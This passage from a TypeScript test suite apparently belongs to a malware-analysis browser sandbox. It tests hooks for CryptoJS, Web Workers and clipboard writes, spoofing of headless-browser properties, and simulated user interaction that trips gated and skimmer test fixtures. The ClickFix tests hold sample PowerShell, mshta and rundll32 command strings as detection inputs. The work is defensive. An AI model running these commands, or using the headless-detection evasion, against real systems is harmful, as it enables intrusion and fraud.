        (window as any).CryptoJS.AES.decrypt('encrypted1', 'key1').toString((window as any).CryptoJS.enc.Utf8);
        (window as any).CryptoJS.DES.decrypt('encrypted2', 'key2').toString((window as any).CryptoJS.enc.Utf8);
        (window as any).CryptoJS.RC4.decrypt('encrypted3', 'key3').toString((window as any).CryptoJS.enc.Utf8);
      });

      await page.waitForTimeout(200);

      const aesEvents = events.filter(e => e.type === 'cryptojs' && e.algorithm === 'AES');
      const desEvents = events.filter(e => e.type === 'cryptojs' && e.algorithm === 'DES');
      const rc4Events = events.filter(e => e.type === 'cryptojs' && e.algorithm === 'RC4');

      expect(aesEvents.length).toBeGreaterThan(0);
      expect(desEvents.length).toBeGreaterThan(0);
      expect(rc4Events.length).toBeGreaterThan(0);

      await page.close();
    });
  });

  describe('Web Worker Instrumentation', () => {
    const workerHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/worker-hooks.js'), 'utf-8');
    const blobHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/blob-hooks.js'), 'utf-8');

    test('should capture Worker creation', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      // Set up instrumentation
      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableWorkers: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(blobHooksScript);
      await page.addInitScript(workerHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Create a worker from a blob URL
      await page.evaluate(() => {
        const workerCode = `
          self.addEventListener('message', function(e) {
            self.postMessage('response: ' + e.data);
          });
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const blobUrl = URL.createObjectURL(blob);
        const worker = new Worker(blobUrl);

        // Send a message
        worker.postMessage('test message');

        // Store for later access
        (window as any).testWorker = worker;
        (window as any).testBlobUrl = blobUrl;
      });

      await page.waitForTimeout(500);

      const workerCreateEvents = events.filter(e => e.type === 'worker' && e.eventType === 'worker_create');
      expect(workerCreateEvents.length).toBeGreaterThan(0);
      expect(workerCreateEvents[0].workerType).toBe('Worker');
      expect(workerCreateEvents[0].scriptURL).toContain('blob:');

      await page.close();
    });

    test('should capture Worker postMessage (to worker)', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableWorkers: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(blobHooksScript);
      await page.addInitScript(workerHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Create a worker and send messages
      await page.evaluate(() => {
        const workerCode = `
          self.addEventListener('message', function(e) {
            self.postMessage('response');
          });
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const blobUrl = URL.createObjectURL(blob);
        const worker = new Worker(blobUrl);

        worker.postMessage({ action: 'test', data: 'hello' });
      });

      await page.waitForTimeout(500);

      const postMessageEvents = events.filter(e =>
        e.type === 'worker' &&
        e.eventType === 'worker_postmessage' &&
        e.direction === 'to_worker'
      );

      expect(postMessageEvents.length).toBeGreaterThan(0);
      expect(postMessageEvents[0].message).toContain('action');
      expect(postMessageEvents[0].message).toContain('test');

      await page.close();
    });

    test('should capture Worker message (from worker)', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableWorkers: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(blobHooksScript);
      await page.addInitScript(workerHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Create a worker that responds to messages (no immediate postMessage to avoid race condition)
      await page.evaluate(() => {
        const workerCode = `
          self.addEventListener('message', function(e) {
            self.postMessage('received: ' + e.data);
          });
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const blobUrl = URL.createObjectURL(blob);
        const worker = new Worker(blobUrl);

        worker.onmessage = function() {
          // Handler will be wrapped and logged
        };

        // Send a message to trigger response (handler is set first, no race condition)
        worker.postMessage('ping');
      });

      await page.waitForTimeout(500);

      const messageEvents = events.filter(e =>
        e.type === 'worker' &&
        e.eventType === 'worker_message' &&
        e.direction === 'from_worker'
      );

      expect(messageEvents.length).toBeGreaterThan(0);
      // Should have the echo message
      const echoMessage = messageEvents.find(e => e.message?.includes('received'));
      expect(echoMessage).toBeDefined();

      await page.close();
    });

    test('should capture Worker errors', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableWorkers: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(blobHooksScript);
      await page.addInitScript(workerHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Create a worker that throws an error when triggered (no immediate throw to avoid race condition)
      await page.evaluate(() => {
        const workerCode = `
          self.addEventListener('message', function(e) {
            if (e.data === 'trigger_error') {
              throw new Error('Test worker error');
            }
          });
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const blobUrl = URL.createObjectURL(blob);
        const worker = new Worker(blobUrl);

        worker.onerror = function(e) {
          // Error handler will be wrapped and logged
          e.preventDefault(); // Prevent error from propagating to console
        };

        // Trigger error AFTER handler is set (no race condition)
        worker.postMessage('trigger_error');
      });

      await page.waitForTimeout(500);

      const errorEvents = events.filter(e =>
        e.type === 'worker' &&
        e.eventType === 'worker_error'
      );

      expect(errorEvents.length).toBeGreaterThan(0);
      expect(errorEvents[0].error).toBeDefined();

      await page.close();
    });

    test('should resolve blob content for Worker created from blob URL', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableWorkers: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_blob_map = {};
      });

      await page.addInitScript(blobHooksScript);
      await page.addInitScript(workerHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Create a worker from a blob with distinctive content
      await page.evaluate(() => {
        const workerCode = `
          // DISTINCTIVE MALICIOUS CODE PATTERN
          self.postMessage('malware worker ready');
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const blobUrl = URL.createObjectURL(blob);

        // Wait a bit for blob content extraction
        setTimeout(function() {
          new Worker(blobUrl);
        }, 100);
      });

      await page.waitForTimeout(500);

      const workerCreateEvents = events.filter(e => e.type === 'worker' && e.eventType === 'worker_create');
      expect(workerCreateEvents.length).toBeGreaterThan(0);

      // Check if blob content was resolved
      const workerWithContent = workerCreateEvents.find(e => e.blobContent);
      expect(workerWithContent).toBeDefined();
      if (workerWithContent) {
        expect(workerWithContent.blobContent).toContain('DISTINCTIVE MALICIOUS CODE PATTERN');
      }

      await page.close();
    });
  });

  // === P3.1: BROWSER OBJECT MODEL SPOOFING TESTS ===
  describe('P3.1 Navigator Property Overrides', () => {
    test('window.chrome object should be injected', async () => {
      const page = await browser.newPage();

      await page.addInitScript(() => {
        (window as any).__test_log_event = () => {}; // no-op
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableHeadlessMitigation: true };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      const chromeCheck = await page.evaluate(() => {
        const loadTimesResult = window.chrome?.loadTimes ? window.chrome.loadTimes() : null;
        const csiResult = window.chrome?.csi ? window.chrome.csi() : null;

        return {
          hasChromeObject: typeof window.chrome === 'object',
          hasRuntime: typeof window.chrome?.runtime === 'object',
          hasLoadTimes: typeof window.chrome?.loadTimes === 'function',
          hasCsi: typeof window.chrome?.csi === 'function',
          hasApp: typeof window.chrome?.app === 'object',
          loadTimesWorks: typeof loadTimesResult === 'object',
          csiWorks: typeof csiResult === 'object'
        };
      });

      expect(chromeCheck.hasChromeObject).toBe(true);
      expect(chromeCheck.hasRuntime).toBe(true);
      expect(chromeCheck.hasLoadTimes).toBe(true);
      expect(chromeCheck.hasCsi).toBe(true);
      expect(chromeCheck.hasApp).toBe(true);
      expect(chromeCheck.loadTimesWorks).toBe(true);
      expect(chromeCheck.csiWorks).toBe(true);

      await page.close();
    });

    test('navigator.languages should return realistic array', async () => {
      const page = await browser.newPage();

      await page.addInitScript(() => {
        (window as any).__test_log_event = () => {}; // no-op
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableHeadlessMitigation: true };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      const languages = await page.evaluate(() => navigator.languages);
      expect(languages).toEqual(['en-US', 'en']);

      await page.close();
    });

    test('navigator.mimeTypes should have realistic entries', async () => {
      const page = await browser.newPage();

      await page.addInitScript(() => {
        (window as any).__test_log_event = () => {}; // no-op
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableHeadlessMitigation: true };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      const mimeTypesCheck = await page.evaluate(() => {
        const types = [];
        for (let i = 0; i < navigator.mimeTypes.length; i++) {
          const mimeType = navigator.mimeTypes[i];
          if (mimeType) {
            types.push({
              type: mimeType.type,
              description: mimeType.description
            });
          }
        }
        return {
          length: navigator.mimeTypes.length,
          types: types,
          hasPdf: types.some(m => m.type.includes('pdf'))
        };
      });

      expect(mimeTypesCheck.length).toBeGreaterThan(0);
      expect(mimeTypesCheck.hasPdf).toBe(true);
      expect(mimeTypesCheck.types.some(m => m.type === 'application/pdf')).toBe(true);

      await page.close();
    });

    test('navigator.vendor should return "Google Inc."', async () => {
      const page = await browser.newPage();

      await page.addInitScript(() => {
        (window as any).__test_log_event = () => {}; // no-op
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableHeadlessMitigation: true };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      const vendor = await page.evaluate(() => navigator.vendor);
      expect(vendor).toBe('Google Inc.');

      await page.close();
    });

    test('all navigator overrides should work together', async () => {
      const page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableHeadlessMitigation: true };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Access all the properties to trigger logging
      const results = await page.evaluate(() => {
        return {
          languages: navigator.languages,
          vendor: navigator.vendor,
          maxTouchPoints: navigator.maxTouchPoints,
          pdfViewerEnabled: navigator.pdfViewerEnabled,
          cookieEnabled: navigator.cookieEnabled,
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          mimeTypesLength: navigator.mimeTypes.length,
          notificationPermission: typeof Notification !== 'undefined' ? Notification.permission : null
        };
      });

      // Verify all properties
      expect(results.languages).toEqual(['en-US', 'en']);
      expect(results.vendor).toBe('Google Inc.');
      expect(results.maxTouchPoints).toBe(0);
      expect(results.pdfViewerEnabled).toBe(true);
      expect(results.cookieEnabled).toBe(true);
      expect(results.userAgent).toContain('Chrome');
      expect(results.userAgent).not.toContain('HeadlessChrome');
      expect(results.language).toBe('en-US');
      expect(results.platform).toBe('Win32');
      expect(results.mimeTypesLength).toBeGreaterThan(0);

      await page.waitForTimeout(500);

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation');
      expect(mitigationEvents.length).toBeGreaterThan(8);

      await page.close();
    });
  });

  // === P3.2: BEHAVIORAL INTERACTION SIMULATION TESTS ===
  describe('P3.2 Behavioral Interaction Simulation', () => {
    test('should trigger basic interaction-gated malware', async () => {
      const page = await browser.newPage();

      // Navigate to interaction gate test fixture
      await page.goto(`file://${__dirname}/fixtures/interaction-gate-test.html`);

      // Simulate mouse movements (at least 3)
      for (let i = 0; i < 5; i++) {
        await page.mouse.move(
          Math.random() * 1280,
          Math.random() * 720,
          { steps: 10 }
        );
        await page.waitForTimeout(100);
      }

      // Simulate scroll (at least 1) - dispatch on document
      await page.evaluate(() => {
        // Add tall content to allow scrolling
        const div = document.createElement('div');
        div.style.height = '2000px';
        document.body.appendChild(div);

        // Scroll and dispatch event on document
        window.scrollTo(0, 100);
        document.dispatchEvent(new Event('scroll', { bubbles: true }));
      });
      await page.waitForTimeout(100);

      // Simulate click (at least 1)
      await page.click('#testBtn');

      // Wait for the page to check interactions (5 seconds + buffer)
      await page.waitForTimeout(6000);

      // Check if malware was triggered
      const result = await page.$eval('#result', el => el.textContent);
      expect(result).toContain('INTERACTION_DETECTED');

      await page.close();
    }, 10000); // 10 second timeout

    test('should trigger form submission-gated malware', async () => {
      const page = await browser.newPage();

      // Navigate to form submission test fixture
      await page.goto(`file://${__dirname}/fixtures/form-submission-gate-test.html`);

      // Simulate form interaction manually (since we're testing the fixture, not the runner)
      await page.focus('#usernameField');
      await page.keyboard.type('testuser');
      await page.focus('#emailField');
      await page.keyboard.type('test@example.com');
      await page.click('button[type="submit"]');

      // Wait for the page to check (8 seconds + buffer)
      await page.waitForTimeout(9000);

      // Check if malware was triggered
      const result = await page.$eval('#result', el => el.textContent);
      expect(result).toContain('FORM_INTERACTION_DETECTED');

      await page.close();
    }, 12000); // 12 second timeout

    test('should trigger checkout skimmer only on checkout URLs', async () => {
      const page = await browser.newPage();

      // Navigate with checkout keyword in URL
      await page.goto(`file://${__dirname}/fixtures/checkout-skimmer-test.html?page=checkout`);

      // Wait to verify it's recognized as checkout page
      await page.waitForTimeout(1000);

      // Simulate payment form interaction
      await page.focus('#cardField');
      await page.keyboard.type('4532123456789012');
      await page.focus('#cvvField');
      await page.keyboard.type('123');
      await page.click('button[type="submit"]');

      // Wait for the page to check (10 seconds + buffer)
      await page.waitForTimeout(11000);

      // Check if skimmer was activated
      const result = await page.$eval('#result', el => el.textContent);
      expect(result).toContain('CARD_DATA_CAPTURED');

      await page.close();
    }, 15000); // 15 second timeout

    test('should NOT trigger checkout skimmer on non-checkout URLs', async () => {
      const page = await browser.newPage();

      // Navigate to a non-checkout URL (important: URL must NOT contain checkout/payment/cart/billing)
      await page.goto('https://example.com/products/item-123');

      // Inject the skimmer HTML via setContent (now window.location.href is example.com/products, not checkout)
      const html = readFileSync(join(__dirname, 'fixtures/checkout-skimmer-test.html'), 'utf-8');
      await page.setContent(html, { waitUntil: 'load' });

      // Wait for DOM to be ready and script to execute
      await page.waitForSelector('#result');
      await page.waitForTimeout(500);

      // Check that skimmer is inactive
      const result = await page.$eval('#result', el => el.textContent);
      expect(result).toContain('NOT A CHECKOUT PAGE');

      await page.close();
    }, 5000); // 5 second timeout

    test('should trigger time-delayed malware with continuous interaction', async () => {
      const page = await browser.newPage();

      // Navigate to time delay test fixture
      await page.goto(`file://${__dirname}/fixtures/time-delay-test.html`);

      // Simulate continuous interaction over 60 seconds
      const interactionInterval = setInterval(() => {
        void (async () => {
          try {
            // Mouse movement
            await page.mouse.move(
              Math.random() * 1280,
              Math.random() * 720,
              { steps: 10 }
            );

            // Occasional scroll
            if (Math.random() < 0.3) {
              await page.mouse.wheel(0, 100);
            }

            // Occasional click
            if (Math.random() < 0.2) {
              await page.mouse.click(500, 500);
            }
          } catch {
            // Ignore errors during interaction
          }
        })();
      }, 2000); // Every 2 seconds

      // Wait for the malware to activate (60 seconds + buffer)
      await page.waitForTimeout(62000);

      // Stop interaction
      clearInterval(interactionInterval);

      // Check if malware was triggered
      const result = await page.$eval('#result', el => el.textContent);
      expect(result).toContain('TIME_DELAY_BYPASS_SUCCESS');

      await page.close();
    }, 70000); // 70 second timeout for this test

    test('form interaction should avoid hidden honeypot fields', async () => {
      const page = await browser.newPage();

      // Create a test page with honeypot fields
      await page.setContent(`
        <!DOCTYPE html>
        <html>
          <body>
            <form>
              <input type="text" id="visible1" name="username" placeholder="Username" />
              <input type="text" id="honeypot1" name="website" style="display: none;" />
              <input type="text" id="visible2" name="email" placeholder="Email" />
              <input type="text" id="honeypot2" name="url" style="visibility: hidden;" />
              <input type="password" id="visible3" name="password" placeholder="Password" />
            </form>
          </body>
        </html>
      `);

      // Check which fields are visible
      const visibilityCheck = await page.$$eval('input', (elements) => {
        return elements.map(el => {
          const style = window.getComputedStyle(el);
          const rect = el.getBoundingClientRect();
          const isVisible =
            style.display !== 'none' &&
            style.visibility !== 'hidden' &&
            parseFloat(style.opacity) >= 0.1 &&
            rect.width >= 1 &&
            rect.height >= 1;

          return {
            id: el.id,
            name: el.name,
            isVisible
          };
        });
      });

      // Verify honeypot detection
      expect(visibilityCheck.find(f => f.id === 'visible1')?.isVisible).toBe(true);
      expect(visibilityCheck.find(f => f.id === 'honeypot1')?.isVisible).toBe(false);
      expect(visibilityCheck.find(f => f.id === 'visible2')?.isVisible).toBe(true);
      expect(visibilityCheck.find(f => f.id === 'honeypot2')?.isVisible).toBe(false);
      expect(visibilityCheck.find(f => f.id === 'visible3')?.isVisible).toBe(true);

      await page.close();
    });

    test('realistic field value generation should work correctly', async () => {
      const page = await browser.newPage();

      // Test field value generation logic
      const values = await page.evaluate(() => {
        function generateRealisticFieldValue(fieldInfo: {
          type: string;
          name: string;
          id: string;
          placeholder: string;
        }): string {
          const fieldLower = `${fieldInfo.name} ${fieldInfo.id} ${fieldInfo.placeholder}`.toLowerCase();

          // Detect field purpose from name/id/placeholder
          if (fieldLower.includes('email')) return 'test.user@example.com';
          if (fieldLower.includes('phone') || fieldLower.includes('tel')) return '555-0123';
          if (fieldLower.includes('zip') || fieldLower.includes('postal')) return '12345';
          if (fieldLower.includes('card') || fieldLower.includes('credit')) return '4532123456789012';
          if (fieldLower.includes('cvv') || fieldLower.includes('cvc') || fieldLower.includes('security')) return '123';
          if (fieldLower.includes('expir') || fieldLower.includes('exp')) return '12/26';
          if (fieldLower.includes('first')) return 'John';
          if (fieldLower.includes('last')) return 'Doe';
          if (fieldLower.includes('user')) return 'testuser';
          if (fieldLower.includes('name')) return 'John Doe';
          if (fieldLower.includes('address') || fieldLower.includes('street')) return '123 Main St';
          if (fieldLower.includes('city')) return 'New York';
          if (fieldLower.includes('state')) return 'NY';
          if (fieldLower.includes('country')) return 'United States';

          // Type-based defaults
          if (fieldInfo.type === 'email') return 'test.user@example.com';
          if (fieldInfo.type === 'tel') return '555-0123';
          if (fieldInfo.type === 'number') return '42';
          if (fieldInfo.type === 'date') return '2026-01-18';
          if (fieldInfo.type === 'password') return 'TestPassword123!';
          if (fieldInfo.type === 'search') return 'test query';
          if (fieldInfo.type === 'url') return 'https://example.com';

          // Generic text
          return 'test input';
        }

        return {
          email: generateRealisticFieldValue({ type: 'email', name: '', id: '', placeholder: '' }),
          emailField: generateRealisticFieldValue({ type: 'text', name: 'email', id: '', placeholder: '' }),
          phone: generateRealisticFieldValue({ type: 'tel', name: '', id: '', placeholder: '' }),
          phoneField: generateRealisticFieldValue({ type: 'text', name: '', id: '', placeholder: 'Phone Number' }),
          card: generateRealisticFieldValue({ type: 'text', name: 'cardnumber', id: '', placeholder: '' }),
          cvv: generateRealisticFieldValue({ type: 'text', name: 'cvv', id: '', placeholder: '' }),
          password: generateRealisticFieldValue({ type: 'password', name: '', id: '', placeholder: '' }),
          zip: generateRealisticFieldValue({ type: 'text', name: '', id: '', placeholder: 'ZIP Code' }),
          firstName: generateRealisticFieldValue({ type: 'text', name: 'firstname', id: '', placeholder: '' }),
          lastName: generateRealisticFieldValue({ type: 'text', name: 'lastname', id: '', placeholder: '' }),
          username: generateRealisticFieldValue({ type: 'text', name: 'username', id: '', placeholder: '' })
        };
      });

      // Verify field values
      expect(values.email).toBe('test.user@example.com');
      expect(values.emailField).toBe('test.user@example.com');
      expect(values.phone).toBe('555-0123');
      expect(values.phoneField).toBe('555-0123');
      expect(values.card).toBe('4532123456789012');
      expect(values.cvv).toBe('123');
      expect(values.password).toBe('TestPassword123!');
      expect(values.zip).toBe('12345');
      expect(values.firstName).toBe('John');
      expect(values.lastName).toBe('Doe');
      expect(values.username).toBe('testuser');

      await page.close();
    });

    test('checkout page URL detection should work correctly', () => {
      const testUrls = [
        { url: 'https://example.com/checkout', expected: true },
        { url: 'https://example.com/payment', expected: true },
        { url: 'https://example.com/cart', expected: true },
        { url: 'https://example.com/onepage', expected: true },
        { url: 'https://example.com/billing', expected: true },
        { url: 'https://example.com/products', expected: false },
        { url: 'https://example.com/home', expected: false },
        { url: 'https://example.com/about', expected: false }
      ];

      for (const { url, expected } of testUrls) {
        const isCheckout = /checkout|payment|cart|onepage|billing/i.test(url);
        expect(isCheckout).toBe(expected);
      }
    });
  });

  describe('Clipboard Hooks Script (ClickFix Detection)', () => {
    test('should intercept navigator.clipboard.writeText (modern ClickFix)', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      // Simulate ClickFix attack with PowerShell payload
      await page.evaluate(async () => {
        const maliciousPayload = 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0';
        await navigator.clipboard.writeText(maliciousPayload);
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      expect(clipboardEvents.length).toBeGreaterThan(0);

      const writeEvent = clipboardEvents.find((e: any) => e.operation === 'writeText');
      expect(writeEvent).toBeDefined();
      expect(writeEvent.method).toBe('navigator.clipboard.writeText');
      expect(writeEvent.data).toContain('powershell');
      expect(writeEvent.success).toBe(true);
      expect(writeEvent.containsPowerShell).toBe(true);
      expect(writeEvent.suspiciousPatterns).toContain('powershell');

      await page.close();
    });

    test('should detect Base64-encoded patterns in clipboard writes', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(async () => {
        const base64Payload = 'powershell -encodedCommand JABMAG8AZwBnAGUAcgA=';
        await navigator.clipboard.writeText(base64Payload);
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      const writeEvent = clipboardEvents.find((e: any) => e.operation === 'writeText');

      expect(writeEvent).toBeDefined();
      expect(writeEvent.isBase64Encoded).toBe(true);
      expect(writeEvent.suspiciousPatterns).toContain('base64');
      expect(writeEvent.suspiciousPatterns).toContain('powershell');

      await page.close();
    });

    test('should detect MSHTA patterns in clipboard writes', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(async () => {
        const mshtaPayload = 'mshta vbscript:Execute("CreateObject(""WScript.Shell"")")';
        await navigator.clipboard.writeText(mshtaPayload);
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      const writeEvent = clipboardEvents.find((e: any) => e.operation === 'writeText');

      expect(writeEvent).toBeDefined();
      expect(writeEvent.containsMSHTA).toBe(true);
      expect(writeEvent.suspiciousPatterns).toContain('mshta');

      await page.close();
    });

    test('should intercept document.execCommand copy (legacy ClickFix)', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(() => {
        const textarea = document.createElement('textarea');
        textarea.value = 'cmd.exe /c rundll32 malware.dll';
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      const execCommandEvent = clipboardEvents.find((e: any) =>
        e.operation === 'execCommand' && e.command === 'copy'
      );

      expect(execCommandEvent).toBeDefined();
      expect(execCommandEvent.method).toBe('document.execCommand');
      expect(execCommandEvent.data).toContain('cmd.exe');
      expect(execCommandEvent.suspiciousPatterns).toContain('run_dialog');

      await page.close();
    });

    test('should NOT log clipboard writes when enableClipboard is false', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: false,  // Disabled
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(async () => {
        await navigator.clipboard.writeText('test content');
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      expect(clipboardEvents.length).toBe(0);

      await page.close();
    });

    test('should respect eventFiltering.clipboard.enableWriteOperations', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051,
          eventFiltering: {
            clipboard: {
              enableWriteOperations: false  // Filter writes
            }
          }
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(async () => {
        await navigator.clipboard.writeText('filtered content');
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
